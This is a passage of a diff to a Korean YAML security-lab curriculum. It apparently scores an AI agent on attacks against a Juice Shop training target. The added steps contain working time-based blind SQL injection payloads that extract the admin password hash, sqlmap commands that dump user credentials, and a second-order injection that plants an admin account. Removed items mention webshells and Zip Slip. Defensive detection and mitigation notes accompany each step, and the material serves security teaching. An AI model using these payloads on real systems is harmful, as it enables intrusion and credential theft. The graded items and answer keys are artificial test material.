+    # 2. 조건 참 (RANDOMBLOB 100MB 실행 — 응답 지연)
+    echo ""
+    echo "=== 2. 참 조건 (RANDOMBLOB 100MB 실행) ==="
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
 
+    # 3. password hash 첫 글자 추출 (Time-based)
+    echo ""
+    echo "=== 3. admin hash[1] 식별 (응답 시간 기반) ==="
+    for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
+      payload="qwert%27))%20AND%20(SELECT%20CASE%20WHEN%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27%20THEN%20RANDOMBLOB(50000000)%20ELSE%201%20END)--"
+      ms=$(curl -s -o /dev/null -w "%{time_total}" "http://juice.6v6.lab/rest/products/search?q=${payload}")
+      # 응답 시간 0.5초 이상이면 TRUE
+      awk -v t="$ms" -v c="$c" 'BEGIN { if (t+0 > 0.5) print "  hash[1]=" c " (time=" t ")" }'
+    done
+    ```
 
+    ## 📋 확인 사항
 
-    [도구 권장] exploit: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등). curl 만 쓰지 말고
-    **공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등)** 등 적합 도구로 호출 후 stdout quote.
+    - 거짓 응답 시간: ~ 0.05 sec (즉시)
+    - 참 응답 시간: 1-5 sec (RANDOMBLOB 100MB random 생성 시간)
+    - admin hash[1] 식별 시 응답 시간 > 0.5 sec
+    - SQLite 의 RANDOMBLOB 외 대안: `WHERE EXISTS(SELECT * FROM Users a, Users b,
+      Users c, ...)` cartesian (조인 폭증) 도 가능
 
+    ## 💡 왜 이걸 하는가?
 
-    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
-- order: 8
-  instruction: '{{WEB_IP}} 대상으로 ZIP 파일 업로드 취약점 테스트을(를) 수행하시오.
+    Time-based Blind SQLi 는 *응답 본문 / 길이* 누설 0 인 환경에서도 작동 —
+    *오직 시간* 만 신호 (MITRE T1190 + OWASP A03). MySQL `SLEEP(5)` / PostgreSQL
+    `pg_sleep(5)` 와 동일 — SQLite 는 native sleep 없으므로 RANDOMBLOB 활용.
+    sqlmap 의 `--technique=T --time-sec=5` 자동화. 한 글자 당 5 sec × 32 자 ×
+    16 후보 = 약 40 분 (Boolean 보다 느리지만 탐지 회피 ↑).
 
+    ## 🔵 Blue 측 관찰
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `exploit` 에 적합한 도구: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf
-    등). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: ZIP 파일 업로드 취약점 테스트 관련 도구와 기법을 활용하세요.
-  category: exploit
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 ZIP 파일 업로드 취약점 테스트을(를) 수행해줘
+    Time-based 의 응답 지연 burst 는 application server 의 CPU/메모리 spike →
+    Wazuh syscheck (system metrics) 또는 Wazuh agent 의 `wodle name="docker-listener"`
+    이상 감지. ModSecurity 의 default 룰은 time-based 검출 *어려움* (응답 시간
+    이 룰 입력 아님) — 별도 custom rule 또는 application-level (Express middleware
+    의 query 시간 logging) 필요. 5 sec 이상 응답 시 alert.
 
-    📎 참고 (CLI): curl -s http://10.20.32.80 2>/dev/null | head -5 && echo ''ZIP 파일
-    업로드 취약점 테스트 완료'''
-  answer_detail: ZIP 파일 업로드 취약점 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: ZIP 업로드 악용 — Zip Slip(../경로 포함) 또는 Zip Bomb(압축해제 시 방대한 파일), 압축해제 시 상위
-        디렉터리 쓰기
-      success_criteria:
-      - Zip Slip 페이로드 생성 (파일 경로에 ../../)
-      - zipbomb 개념 언급
-      - 방어(경로 정규화, 압축 크기/파일수 제한) 제시
-      acceptable_methods:
-      - python zipfile 로 악성 zip 생성
-      - evilarc 도구
-      - mkzip --traversal
-      - ZipSlip GitHub POC
-      negative_signs:
-      - 경로 조작 페이로드 없음
-      - 압축 폭탄 개념 부재
-      - 방어책 없음
-  target_vm: attacker
-  script: curl -s http://10.20.32.80 2>/dev/null | head -5 && echo 'ZIP 파일 업로드 취약점
-    테스트 완료'
-  risk_level: medium
-  bastion_prompt: '10.20.32.80 대상으로 ZIP 파일 업로드 취약점 테스트을(를) 수행해줘
+    ## 🟣 Purple 보완 권장
 
-
-
-
-    [도구 권장] exploit: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등). curl 만 쓰지 말고
-    **공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등)** 등 적합 도구로 호출 후 stdout quote.
-
-
-    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
-- order: 9
-  instruction: '{{WEB_IP}} 대상으로 업로드 경로 추측을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `recon` 에 적합한 도구: whatweb, nmap -sV, nikto, wafw00f.
-    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 업로드 경로 추측 관련 도구와 기법을 활용하세요.
-  category: recon
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 업로드 경로 추측을(를) 수행해줘
-
-    📎 참고 (CLI): nmap -sV -p 80,443 10.20.32.80 2>/dev/null | head -10 && echo ''업로드
-    경로 추측 완료'''
-  answer_detail: 업로드 경로 추측은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: 업로드 경로 추측 — /uploads /files /media 등 일반 경로 + 원본 파일명 조합으로 직접 URL 탐색
-      success_criteria:
-      - 일반 업로드 경로 목록 (uploads/files/media/assets) 시도
-      - 업로드 후 반환된 파일명·경로 힌트 분석
-      - 디렉터리 리스팅 또는 파일명 예측 결합
-      acceptable_methods:
-      - curl <url>/uploads/<file>
-      - gobuster dir 로 경로 탐색
-      - 업로드 응답 body/location 분석
-      - wfuzz 로 파일명 brute
-      negative_signs:
-      - 경로 추측 없음
-      - 응답 분석 없음
-      - 랜덤 파일명 이슈 언급 없음
-  target_vm: attacker
-  script: nmap -sV -p 80,443 10.20.32.80 2>/dev/null | head -10 && echo '업로드 경로 추측
-    완료'
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 업로드 경로 추측을(를) 수행해줘
-
-
-
-
-    [도구 권장] recon: whatweb, nmap -sV, nikto, wafw00f. curl 만 쓰지 말고 **whatweb** 등 적합
-    도구로 호출 후 stdout quote.
-
-
-    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
-- order: 10
-  instruction: '{{WEB_IP}} 대상으로 업로드된 파일 실행 확인을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `exploit` 에 적합한 도구: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf
-    등). 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 업로드된 파일 실행 확인 관련 도구와 기법을 활용하세요.
-  category: exploit
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 업로드된 파일 실행 확인을(를) 수행해줘
-
-    📎 참고 (CLI): curl -s http://10.20.32.80 2>/dev/null | head -5 && echo ''업로드된 파일
-    실행 확인 완료'''
-  answer_detail: 업로드된 파일 실행 확인은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: 업로드 파일 실행 확인 — 업로드된 파일을 브라우저/curl 로 GET 해서 RCE 성공 판정
-      success_criteria:
-      - curl <url>/uploads/shell.php?cmd=id 로 명령 실행 시도
-      - 응답에 id 결과(uid=...) 포함되는지 확인
-      - 실행 실패 원인(MIME, X-Content-Type-Options, .htaccess) 해석
-      acceptable_methods:
-      - curl <url>/<uploaded>?cmd=<command>
-      - browser 직접 접속
-      - weevely terminal shell.php
-      - <SENSITIVE:b99e8884576269bd>
-      negative_signs:
-      - 실행 시도 없이 업로드만 확인
-      - 응답 해석 없음
-      - 실행 차단 원인 분석 없음
-  target_vm: attacker
-  script: curl -s http://10.20.32.80 2>/dev/null | head -5 && echo '업로드된 파일 실행 확인
-    완료'
-  risk_level: medium
-  bastion_prompt: '10.20.32.80 대상으로 업로드된 파일 실행 확인을(를) 수행해줘
-
-
-
-
-    [도구 권장] exploit: 공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등). curl 만 쓰지 말고
-    **공격 종류에 맞는 전용 도구 (sqlmap/xsstrike/hydra/ffuf 등)** 등 적합 도구로 호출 후 stdout quote.
-
-
-    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
-- order: 11
-  instruction: '{{WEB_IP}} 대상으로 파일 크기 제한 테스트을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `upload` 에 적합한 도구: curl -F file=@shell.php, weevely
-    백도어. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 파일 크기 제한 테스트 관련 도구와 기법을 활용하세요.
-  category: upload
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 파일 크기 제한 테스트을(를) 수행해줘
-
-    📎 참고 (CLI): curl -s http://10.20.32.80 2>/dev/null | head -5 && echo ''파일 크기 제한
-    테스트 완료'''
-  answer_detail: 파일 크기 제한 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect:
-    - 완료
-    - '413'
-    field: stdout
-    semantic:
-      intent: 파일 크기 제한 테스트 — 대용량 파일 업로드로 서버 검증·DoS 가능성 평가
-      success_criteria:
-      - 10MB 이상 파일 생성 후 업로드 시도
-      - 서버 응답(413 Payload Too Large 또는 500) 분석
-      - DoS 방어(client_max_body_size, upload_max_filesize) 언급
-      acceptable_methods:
-      - dd if=/dev/zero of=big.bin bs=1M count=100
-      - curl -F file=@big.bin
-      - python requests files 대용량 stream
-      - nginx/PHP 설정 값 확인
-      negative_signs:
-      - 소용량만 업로드
-      - 413 응답 해석 없음
-      - DoS 방어 언급 없음
-  target_vm: attacker
-  script: curl -s http://10.20.32.80 2>/dev/null | head -5 && echo '파일 크기 제한 테스트 완료'
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 파일 크기 제한 테스트을(를) 수행해줘
-
-
-    [도구 권장] upload: curl -F file=@shell.php, weevely 백도어. curl 만 쓰지 말고 **curl -F file=@shell.php**
-    등 적합 도구로 호출 후 stdout quote.'
-- order: 12
-  instruction: '{{WEB_IP}} 대상으로 업로드 디렉터리 권한 확인을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
-    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 업로드 디렉터리 권한 확인 관련 도구와 기법을 활용하세요.
-  category: defense
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 업로드 디렉터리 권한 확인을(를) 수행해줘
-
-    📎 참고 (CLI): echo ''=== 업로드 디렉터리 권한 확인 ==='' && echo ''조치 방안 정리 완료'''
-  answer_detail: 업로드 디렉터리 권한 확인은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: 업로드 디렉터리 권한 확인 — 업로드 디렉터리에 execute 권한이 있어야 webshell 실행 — nginx location,
-        Apache Options 설정 검토
-      success_criteria:
-      - 업로드 경로의 HTTP 실행 가능 여부 확인(PHP handler, Options +ExecCGI)
-      - '방어: location ~ \.php$ { deny all; } 설정 예시'
-      - 파일 퍼미션(chmod) 대신 실행 차단이 핵심 방어임 언급
-      acceptable_methods:
-      - curl <url>/uploads/test.php 로 확인
-      - nginx config dump
-      - Apache .htaccess 검사
-      - 'X-Content-Type-Options: nosniff 헤더'
-      negative_signs:
-      - 권한만 확인 (실행 가능성 무시)
-      - 설정 파일 검토 없음
-      - nosniff 언급 없음
-  target_vm: attacker
-  script: echo '=== 업로드 디렉터리 권한 확인 ===' && echo '조치 방안 정리 완료'
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 업로드 디렉터리 권한 확인을(를) 수행해줘
-
-
-    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
-    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
-- order: 13
-  instruction: '{{WEB_IP}} 대상으로 안전한 업로드 구현 방안 정리을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
-    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 안전한 업로드 구현 방안 정리 관련 도구와 기법을 활용하세요.
-  category: defense
-  points: 10
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 안전한 업로드 구현 방안 정리을(를) 수행해줘
-
-    📎 참고 (CLI): echo ''=== 안전한 업로드 구현 방안 정리 ==='' && echo ''조치 방안 정리 완료'''
-  answer_detail: 안전한 업로드 구현 방안 정리은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
-  verify:
-    type: output_contains
-    expect: 완료
-    field: stdout
-    semantic:
-      intent: 안전한 업로드 구현 방안 — 확장자 화이트리스트 + MIME 검증 + 매직 바이트 + 저장소 분리 + 실행 차단 + 랜덤
-        파일명 + 안티바이러스 스캔 다층
-      success_criteria:
-      - 최소 5가지 방어 계층 언급
-      - OWASP File Upload Cheat Sheet 참조
-      - CDN/S3 등 static 전용 스토리지 분리 권장
-      acceptable_methods:
-      - 화이트리스트 + MIME + magic + size + random name
-      - ClamAV 스캔 통합
-      - AWS S3 presigned URL 분리
-      - 이미지 재인코딩 (PIL save)
-      negative_signs:
-      - 방어 2개 이하
-      - 분리 저장소 언급 없음
-      - AV 스캔 누락
-  target_vm: attacker
-  script: echo '=== 안전한 업로드 구현 방안 정리 ===' && echo '조치 방안 정리 완료'
-  risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 안전한 업로드 구현 방안 정리을(를) 수행해줘
-
-
-    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
-    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
-- order: 14
-  instruction: '{{WEB_IP}} 대상으로 업로드 모니터링 설정을(를) 수행하시오.
-
-
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
-    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 업로드 모니터링 설정 관련 도구와 기법을 활용하세요.
-  category: defense
+    - **응답 시간 균일화**: Express middleware `setTimeout(res.end, 200)` 으로
+      모든 응답 최소 200ms — RANDOMBLOB 의 1 sec 지연도 200ms baseline + 800ms
+      만 보임 → 신호 약화 (완전 차단 X)
+    - **query timeout**: Sequelize `dialectOptions: { timeout: 1000 }` 으로
+      모든 SQL query 1 sec 초과 시 강제 종료
+    - **rate-limit**: time-based 의 한 글자 당 16 요청 burst 도 express-rate-limit
+      5 req/sec 으로 차단
+    - **monitoring**: Express middleware 의 query duration histogram → Sentry /
+      Prometheus → P99 > 1 sec spike 시 alert
+  hint: |
+    SQLite 는 SLEEP() 미지원 → RANDOMBLOB(100000000) (100MB random) 으로 응답
+    지연 trigger. `curl -w "%{time_total}"` 로 응답 시간 측정. 응답 시간 > 0.5
+    sec 이면 조건 TRUE.
+  category: sqli_blind
   points: 12
-  answer: '🤖 프롬프트: 10.20.32.80 대상으로 업로드 모니터링 설정을(를) 수행해줘
-
-    📎 참고 (CLI): echo ''=== 업로드 모니터링 설정 ==='' && echo ''조치 방안 정리 완료'''
-  answer_detail: 업로드 모니터링 설정은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
+  answer: |
+    echo "=== 1. 거짓 baseline (즉시) ==="
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=2%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
+    echo ""
+    echo "=== 2. 참 조건 (RANDOMBLOB 100MB) ==="
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--"
+    echo ""
+    echo "=== 3. admin hash[1] 식별 (Time-based) ==="
+    for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
+      payload="qwert%27))%20AND%20(SELECT%20CASE%20WHEN%20SUBSTR((SELECT%20password%20FROM%20Users%20WHERE%20email=%27admin@juice-sh.op%27),1,1)=%27${c}%27%20THEN%20RANDOMBLOB(50000000)%20ELSE%201%20END)--"
+      ms=$(curl -s -o /dev/null -w "%{time_total}" "http://juice.6v6.lab/rest/products/search?q=${payload}")
+      awk -v t="$ms" -v c="$c" 'BEGIN { if (t+0 > 0.5) print "hash[1]=" c " (time=" t ")" }'
+    done
+  answer_detail: |
+    Time-based 는 응답 본문 / 길이 노출이 0 인 환경에서 작동 — 가장 stealthy.
+    RANDOMBLOB(50000000) 는 50MB random 생성 (1-2 sec 소요). 한 글자 당 16 후보
+    × 1-2 sec = 16-32 sec / 글자 → 32 자 hash = 8-17 분. sqlmap --technique=T
+    자동화. 운영 web 의 응답 시간 균일화 (setTimeout) + query timeout 으로 차단.
   verify:
     type: output_contains
-    expect: 완료
+    expect: 'real\|time\|sys'
     field: stdout
     semantic:
-      intent: 업로드 모니터링 설정 — inotifywait 또는 auditd 로 업로드 경로 파일 생성 탐지 + SIEM 로깅
+      intent: |
+        Time-based Blind SQLi — RANDOMBLOB 응답 지연으로 비트 누설. Boolean
+        도 차단된 환경 대안. MITRE T1190 + OWASP A03 + 응답 sanitize 완전
+        bypass 가능.
       success_criteria:
-      - inotifywait -m -e create <dir> 명령 또는 auditctl -w <dir> -p wa
-      - 생성 이벤트를 syslog/SIEM 으로 포워딩
-      - 이상 파일(.php 등) 자동 알람 로직
+        - 거짓 baseline (즉시) vs 참 (지연) 응답 시간 비교
+        - RANDOMBLOB 또는 동등 SQLite 지연 함수 사용
+        - curl -w time_total 또는 time 명령 측정
+        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
       acceptable_methods:
-      - inotifywait 실시간 감시
-      - auditd -w 감사 룰
-      - Wazuh FIM (File Integrity Monitoring)
-      - Falco 런타임 규칙
+        - "curl -w '%{time_total}' + CASE WHEN ... THEN RANDOMBLOB"
+        - "sqlmap -u '...?q=*' --batch --technique=T --time-sec=5"
+        - "time curl + Boolean 결과 비교"
+        - "python requests + timeit"
       negative_signs:
-      - 모니터링 도구 없이 설명만
-      - SIEM 통합 없음
-      - 알람 로직 없음
+        - 응답 시간 측정 없음 (curl 단일 호출만)
+        - 거짓/참 baseline 비교 없음
+        - Boolean 과 차이 (응답 sanitize bypass) 설명 누락
   target_vm: attacker
-  script: echo '=== 업로드 모니터링 설정 ===' && echo '조치 방안 정리 완료'
+  script: |
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=2%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--" 2>&1
+    time curl -s -o /dev/null "http://juice.6v6.lab/rest/products/search?q=qwert%27))%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--" 2>&1
   risk_level: low
-  bastion_prompt: '10.20.32.80 대상으로 업로드 모니터링 설정을(를) 수행해줘
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    에 Time-based Blind SQLi 시도 — (1) 거짓 baseline (즉시) (2) 참 조건
+    RANDOMBLOB(100000000) 100MB 지연 (3) admin password hash 첫 글자 for-loop
+    + 응답 시간 비교. SQLite 는 SLEEP() 미지원 → RANDOMBLOB 사용. sqlmap
+    --technique=T 자동화 언급. Purple = 응답 시간 균일화 + query timeout +
+    rate-limit + Sentry P99 monitoring.
+# ============================================================
+# STEP 8 [RED·SQLi·자동화] — sqlmap 으로 STEP 1-7 통합 자동화 + dump
+# ============================================================
+- order: 8
+  instruction: |
+    ## 🎯 MISSION
+
+    STEP 1-7 의 수동 시도 (탐지/Error/UNION/Boolean/Time) 를 sqlmap 한 줄로
+    자동화 — `--batch --technique=BEUSTQ --dbs --tables --dump` 통합 실행.
+    출력 결과 (DB type / table list / column / 데이터 row) 직접 인용 + 수동
+    결과 와 비교.
+
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. 기본 탐지 (--batch = 비대화형, level/risk 기본)
+    echo "=== 1. 기본 탐지 (level 1, risk 1) ==="
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
+      --batch --level=1 --risk=1 2>&1 | tail -25
+
+    # 2. DB / 테이블 list (--dbs --tables)
+    echo ""
+    echo "=== 2. DB + 테이블 list ==="
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
+      --batch --level=2 --dbs --tables 2>&1 | grep -E 'Database:|Table:' | head -20
+
+    # 3. Users 테이블 dump (column + 데이터)
+    echo ""
+    echo "=== 3. Users 테이블 column + row dump (5 row) ==="
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
+      --batch --level=2 -T Users --columns 2>&1 | grep -E 'Column|Type' | head -15
+    echo ""
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
+      --batch --level=2 -T Users -C email,password --dump 2>&1 | grep '@' | head -5
+
+    # 4. 모든 technique 강제 (BEUSTQ = Boolean + Error + Union + Stacked + Time + inline Q)
+    echo ""
+    echo "=== 4. 모든 technique 시도 ==="
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
+      --batch --level=3 --risk=2 --technique=BEUSTQ 2>&1 | grep -E 'injection|technique' | head -10
+    ```
+
+    ## 📋 확인 사항
+
+    - sqlmap 탐지 결과 의 `Parameter: q (GET)` + `Type: <technique>` + `Title: ...`
+    - DB 종류 `back-end DBMS: SQLite` 직접 확인
+    - Users 테이블 column list (id/email/password/role/...)
+    - dump 결과 의 admin@juice-sh.op + MD5 hash (STEP 5 와 일치)
+    - technique = Boolean + Error + Union + Time 모두 가능 (Juice Shop 의 의도 challenge)
+
+    ## 💡 왜 이걸 하는가?
+
+    sqlmap 은 OWASP / NIST 가 인정 한 SQL Injection 자동화 표준 (PenTest+ /
+    OSCP 시험 도구). STEP 1-7 의 수동 시도를 한 줄 로 종합 + 더 많은 payload
+    (--level 3-5 / --risk 2-3) + DB 별 specific 페이로드 + tamper 스크립트
+    (WAF 우회). 학습 환경 의 default = `--level=1 --risk=1` 충분 (Juice Shop
+    의 의도 challenge 모두 매핑됨).
+
+    ## 🔵 Blue 측 관찰
+
+    sqlmap 의 default User-Agent = `sqlmap/X.Y.Z` → ModSecurity CRS rule 913100
+    (Found User-Agent associated with security scanner) 즉시 트리거. burst
+    요청 (수 천 회) 도 rule 920400 (Excessive request) 추가 트리거. Wazuh
+    의 alert (`sqlmap detected` keyword) escalation → active-response 자동 차단.
+    sqlmap 의 `--random-agent` 옵션 으로 우회 가능 — Purple 의 다층 방어 필요.
+
+    ## 🟣 Purple 보완 권장
+
+    - ModSecurity CRS PARANOIA LEVEL 3 + rule 913100 + 913110 (commercial scanner)
+      모두 enable → sqlmap default UA 즉시 차단
+    - rate-limit: HAProxy stick-table 10 req/sec 이상 src IP 차단 → sqlmap 의
+      burst 불가능
+    - **근본 fix**: STEP 1-7 의 모든 Purple 권고 (parameterized query + ORM +
+      attribute whitelist + 응답 sanitize + 시간/길이 균일화) 모두 적용 시
+      sqlmap 의 `--level=5 --risk=3 --tamper=...` 도 false negative
+    - **WAF 단**: ModSecurity + libinjection 의 결합 — sqlmap 의 1000+ payload
+      대부분 차단
+  hint: |
+    sqlmap 은 attacker 컨테이너 에 설치됨 (which sqlmap 확인). `--batch` 는
+    모든 prompt 에 default 응답 (비대화형). `-T Users -C email,password --dump`
+    로 특정 테이블 의 특정 컬럼 만 dump. tail -25 또는 `grep -E 'Database|Table:'`
+    로 핵심 출력만.
+  category: sqli_tool
+  points: 10
+  answer: |
+    echo "=== 1. sqlmap 기본 탐지 ==="
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
+      --batch --level=1 --risk=1 2>&1 | tail -25
+    echo ""
+    echo "=== 2. DB + 테이블 list ==="
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
+      --batch --level=2 --dbs --tables 2>&1 | grep -E 'Database:|Table:' | head -20
+    echo ""
+    echo "=== 3. Users column + admin dump ==="
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' \
+      --batch --level=2 -T Users --columns 2>&1 | grep -E 'Column|Type' | head -10
+  answer_detail: |
+    sqlmap 의 Juice Shop /rest/products/search 탐지 결과 = 모든 technique
+    (B/E/U/T) 매핑 — Juice Shop 이 의도된 학습 challenge 이므로 명확히 vulnerable.
+    `back-end DBMS: SQLite` 확인. Users dump 의 admin@juice-sh.op + MD5 hash
+    (0192023a...) 자동 발견. 운영 web 의 sqlmap 결과 = `all tested parameters
+    do not appear to be injectable` (정상). PenTest+ / OSCP 시험 도구.
+  verify:
+    type: output_contains
+    expect: 'sqlmap\|Database\|Type'
+    field: stdout
+    semantic:
+      intent: |
+        sqlmap 자동화 — STEP 1-7 수동 시도의 통합 + 더 많은 payload + DB
+        specific. OWASP / NIST 표준 도구. PenTest+ / OSCP 의 SQL Injection
+        섹션의 사실상 표준.
+      success_criteria:
+        - sqlmap -u URL --batch 기본 실행 + 결과 인용
+        - --dbs / --tables / -T Users --dump 중 1 이상 시도
+        - back-end DBMS 또는 테이블 list 인용
+        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
+      acceptable_methods:
+        - "sqlmap -u '...' --batch --level=1 --dbs"
+        - "sqlmap --tamper=between,space2comment 등 WAF 우회"
+        - "sqlmap --technique=BEUSTQ + --level=5 --risk=3"
+        - "sqlmap --os-shell (고급 — exploit 단계)"
+      negative_signs:
+        - sqlmap 실행 없이 개념만
+        - 결과 인용 누락 (단순 '완료' 메시지)
+        - DB / 테이블 list 직접 인용 누락
+  target_vm: attacker
+  script: |
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' --batch --level=1 --risk=1 2>&1 | tail -25
+    sqlmap -u 'http://juice.6v6.lab/rest/products/search?q=test' --batch --level=2 --dbs --tables 2>&1 | grep -E 'Database:|Table:' | head -20
+  risk_level: low
+  bastion_prompt: |
+    attacker 컨테이너에서 sqlmap 으로 6v6-juiceshop (10.20.40.81:3000) 의
+    /rest/products/search?q=test 에 SQL Injection 자동 탐지 — (1) --batch
+    --level=1 기본 탐지 (2) --dbs --tables 로 DB + 테이블 list (3) -T Users
+    --columns 으로 column list. STEP 1-7 의 수동 결과와 비교 + back-end
+    DBMS SQLite + Users dump 의 admin@juice-sh.op + MD5 hash 직접 인용.
+    Purple = ModSec CRS 913100 + rate-limit + 근본 fix (parameterized query
+    + 응답 sanitize) 5 단 방어.
+# ============================================================
+# STEP 9 [RED·SQLi·Advanced] — Second-Order SQLi (저장 → 다른 페이지 의 실행)
+# ============================================================
+- order: 9
+  instruction: |
+    ## 🎯 MISSION
+
+    Second-Order SQLi 는 *1단계 저장 시 무해* + *2단계 다른 페이지 에서 쿼리
+    삽입 시 실행* 되는 두 단계 흐름. Juice Shop 의 회원가입 → 프로필 조회
+    또는 password reset 시나리오 로 1, 2 단계 직접 시도. 1차 ModSecurity
+    탐지 회피 + 2차 trigger.
+
+    ## 💻 실행 명령
+
+    ```bash
+    # 1단계: 회원가입 시 username 에 SQL payload 삽입 (저장 시점 무해)
+    echo "=== 1단계: payload 포함 회원가입 ==="
+    PAYLOAD="evil'),(NULL,'admin2@juice-sh.op','MD5HASH','admin',NULL,NULL,NULL,NULL),('test"
+    curl -s -i -X POST http://juice.6v6.lab/api/Users/ \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"${PAYLOAD}\",\"password\":\"test123\"}" | head -10
+    # 응답: 200 (등록 성공) — payload 자체는 검증 안됨
+
+    # 2단계: 저장된 username 이 다른 query 에서 사용되는 시점 (password reset)
+    echo ""
+    echo "=== 2단계: password reset trigger ==="
+    curl -s -i -X POST http://juice.6v6.lab/rest/user/reset-password \
+      -H 'Content-Type: application/json' \
